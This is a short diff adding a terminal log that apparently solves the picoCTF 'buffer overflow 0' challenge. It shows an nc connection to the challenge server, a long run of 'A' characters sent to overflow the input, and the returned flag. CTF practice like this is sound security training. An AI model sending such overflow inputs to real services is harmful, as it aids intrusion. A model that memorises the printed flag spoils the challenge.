@@ -1,0 +1,4 @@
+┌─[cristian@Prestige-13-AI]─[~/Descargas/picoCTF/24/buffer overflow 0]
+└──╼ $ nc saturn.picoctf.net 54899
+Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
